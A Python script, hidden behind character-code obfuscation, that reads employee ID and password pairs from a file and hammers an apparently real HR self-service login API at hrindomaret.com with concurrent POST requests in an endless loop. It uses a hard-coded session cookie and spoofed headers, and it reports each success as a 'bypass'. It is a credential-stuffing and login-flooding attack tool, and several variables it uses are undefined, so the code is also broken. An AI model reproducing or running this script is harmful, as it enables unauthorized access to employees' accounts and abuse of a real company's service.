import aiohttp
Dc=print
Dd=range
Ds=open
Dw=file
DU=int
DV=input
DG=ValueError
Du=True
DO=aiohttp.ClientSession
Dk=aiohttp.ClientError
import asyncio
Dz=asyncio.run
DT=asyncio.gather
import time
Df=time.time

async def DW(session, DY, Do):
    DE = {
("".join([chr(68),chr(97),chr(116),chr(97)]))              : {
("".join([chr(110),chr(105),chr(107)]))                 : DY,
("".join([chr(112),chr(97),chr(115),chr(115)]))                  : Do,
        }
    }

    Dt = {
("".join([chr(72),chr(111),chr(115),chr(116)]))              :("".join([chr(97),chr(112),chr(105),chr(46),chr(104),chr(114),chr(105),chr(110),chr(100),chr(111),chr(109),chr(97),chr(114),chr(101),chr(116),chr(46),chr(99),chr(111),chr(109)]))                                     ,
("".join([chr(65),chr(99),chr(99),chr(101),chr(112),chr(116)]))                :("".join([chr(97),chr(112),chr(112),chr(108),chr(105),chr(99),chr(97),chr(116),chr(105),chr(111),chr(110),chr(47),chr(106),chr(115),chr(111),chr(110),chr(44),chr(32),chr(116),chr(101),chr(120),chr(116),chr(47),chr(112),chr(108),chr(97),chr(105),chr(110),chr(44),chr(32),chr(42),chr(47),chr(42)]))                                                     ,
("".join([chr(67),chr(111),chr(110),chr(116),chr(101),chr(110),chr(116),chr(45),chr(84),chr(121),chr(112),chr(101)]))                      :("".join([chr(97),chr(112),chr(112),chr(108),chr(105),chr(99),chr(97),chr(116),chr(105),chr(111),chr(110),chr(47),chr(106),chr(115),chr(111),chr(110)]))                                          ,
("".join([chr(79),chr(114),chr(105),chr(103),chr(105),chr(110)]))                :("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(101),chr(115),chr(115),chr(45),chr(111),chr(110),chr(108),chr(105),chr(110),chr(101),chr(46),chr(104),chr(114),chr(105),chr(110),chr(100),chr(111),chr(109),chr(97),chr(114),chr(101),chr(116),chr(46),chr(99),chr(111),chr(109)]))                                                      ,
("".join([chr(82),chr(101),chr(102),chr(101),chr(114),chr(101),chr(114)]))                 :("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(101),chr(115),chr(115),chr(45),chr(111),chr(110),chr(108),chr(105),chr(110),chr(101),chr(46),chr(104),chr(114),chr(105),chr(110),chr(100),chr(111),chr(109),chr(97),chr(114),chr(101),chr(116),chr(46),chr(99),chr(111),chr(109),chr(47)]))                                                        ,
("".join([chr(67),chr(111),chr(111),chr(107),chr(105),chr(101)]))                :("".join([chr(108),chr(97),chr(114),chr(97),chr(118),chr(101),chr(108),chr(95),chr(115),chr(101),chr(115),chr(115),chr(105),chr(111),chr(110),chr(61),chr(101),chr(121),chr(74),chr(112),chr(100),chr(105),chr(73),chr(54),chr(73),chr(108),chr(112),chr(53),chr(84),chr(69),chr(86),chr(50),chr(82),chr(51),chr(90),chr(85),chr(89),chr(109),chr(104),chr(75),chr(81),chr(87),chr(103),chr(50),chr(78),chr(110),chr(86),chr(111),chr(82),chr(71),chr(104),chr(84),chr(81),chr(108),chr(69),chr(57),chr(80),chr(83),chr(73),chr(115),chr(73),chr(110),chr(90),chr(104),chr(98),chr(72),chr(86),chr(108),chr(73),chr(106),chr(111),chr(105),chr(83),chr(85),chr(120),chr(80),chr(99),chr(106),chr(82),chr(70),chr(82),chr(84),chr(100),chr(99),chr(76),chr(50),chr(107),chr(122),chr(98),chr(49),chr(78),chr(69),chr(85),chr(48),chr(90),chr(78),chr(81),chr(85),chr(120),chr(68),chr(100),chr(87),chr(104),chr(111),chr(75),chr(49),chr(90),chr(105),chr(78),chr(85),chr(120),chr(108),chr(101),chr(107),chr(100),chr(76),chr(99),chr(109),chr(111),chr(114),chr(77),chr(107),chr(49),chr(88),chr(77),chr(48),chr(49),chr(90),chr(85),chr(107),chr(100),chr(50),chr(75),chr(50),chr(82),chr(76),chr(81),chr(109),chr(90),chr(108),chr(82),chr(49),chr(73),chr(122),chr(87),chr(71),chr(90),chr(114),chr(87),chr(88),chr(85),chr(122),chr(89),chr(105),chr(116),chr(121),chr(87),chr(106),chr(89),chr(105),chr(76),chr(67),chr(74),chr(116),chr(89),chr(87),chr(77),chr(105),chr(79),chr(105),chr(73),chr(50),chr(79),chr(84),chr(85),chr(52),chr(89),chr(50),chr(69),chr(49),chr(77),chr(71),chr(89),chr(121),chr(78),chr(84),chr(77),chr(49),chr(77),chr(106),chr(69),chr(121),chr(78),chr(84),chr(66),chr(108),chr(78),chr(84),chr(81),chr(51),chr(90),chr(87),chr(73),chr(120),chr(79),chr(87),chr(77),chr(119),chr(89),chr(106),chr(100),chr(109),chr(78),chr(122),chr(108),chr(104),chr(77),chr(84),chr(99),chr(52),chr(78),chr(109),chr(77),chr(53),chr(78),chr(50),chr(69),chr(49),chr(90),chr(68),chr(65),chr(122),chr(89),chr(84),chr(90),chr(106),chr(90),chr(71),chr(86),chr(105),chr(89),chr(122),chr(81),chr(122),chr(89),chr(109),chr(74),chr(108),chr(89),chr(122),chr(66),chr(107),chr(79),chr(84),chr(69),chr(53),chr(73),chr(110),chr(48),chr(37),chr(51),chr(68)]))                                                                                                                                                                                                                                                                                          ,  # Ganti jika perlu
    }

    try:
        async with session.post(("".join([chr(104),chr(116),chr(116),chr(112),chr(115),chr(58),chr(47),chr(47),chr(97),chr(112),chr(105),chr(46),chr(104),chr(114),chr(105),chr(110),chr(100),chr(111),chr(109),chr(97),chr(114),chr(101),chr(116),chr(46),chr(99),chr(111),chr(109),chr(47),chr(97),chr(112),chr(105),chr(47),chr(69),chr(83),chr(83),chr(47),chr(76),chr(111),chr(103),chr(105),chr(110)]))                                                                           , json=DE, headers=Dt) as DC:
            DC.raise_for_status()
            if DC.status ==int("".join([chr(50),chr(48),chr(48)]))                               :
                Dc(f"\n[INFO] BYPASS untuk NIK {nik} SUKSES")
                Dc(await DC.json())
            else:
                Dc(f"\n[ERROR] Login gagal untuk NIK {nik}. Kode kesalahan: {response.status}")
                Dc(f"        Pesan: {await response.text()}\n")
    except Dk as e:
        Dc(f"[ERROR] Terjadi kesalahan pada request: {e}\n")

async def Dh(DB, DL):
    async with DO() as session:
        for i in Dd(DL):
            Dc(f"\n[INFO] BYPASS KE -{i + 1}")
            Da = Df()
            DS = [DW(session, DY, Do) for DY, Do in DB]
            await DT(*DS)
            Dc(f"[INFO] Waktu yang dibutuhkan: {time.time() - start_time:.2f} detik\n")

def DF():
    # Membaca NIK dan password dari file
    DB = []
    with Ds(("".join([chr(112),chr(97),chr(115),chr(115),chr(119),chr(111),chr(114),chr(100),chr(46),chr(116),chr(120),chr(116)]))                          ,("".join([chr(114)]))                               ) as Dw:
        for DI in Dw:
            DY, Do = DI.strip().split(("".join([chr(44)]))                                         )
            DB.append((DY, Do))

    # Minta jumlah periksa dari pengguna
    try:
        DL = DU(DV(("".join([chr(66),chr(89),chr(80),chr(65),chr(83),chr(83),chr(32),chr(66),chr(69),chr(82),chr(65),chr(80),chr(65),chr(32),chr(75),chr(65),chr(76),chr(73),chr(63),chr(32),chr(58),chr(32)]))                                           ))
    except DG:
        Dc(("".join([chr(91),chr(69),chr(82),chr(82),chr(79),chr(82),chr(93),chr(32),chr(73),chr(110),chr(112),chr(117),chr(116),chr(32),chr(116),chr(105),chr(100),chr(97),chr(107),chr(32),chr(118),chr(97),chr(108),chr(105),chr(100),chr(46),chr(32),chr(77),chr(97),chr(115),chr(117),chr(107),chr(107),chr(97),chr(110),chr(32),chr(97),chr(110),chr(103),chr(107),chr(97),chr(46)]))                                                       )
        return

    # Jalankan pemeriksaan terus-menerus
    while Du:
        Dz(Dh(DB, DL))

if __name__ ==("".join([chr(95),chr(95),chr(109),chr(97),chr(105),chr(110),chr(95),chr(95)]))                         :
    DF()
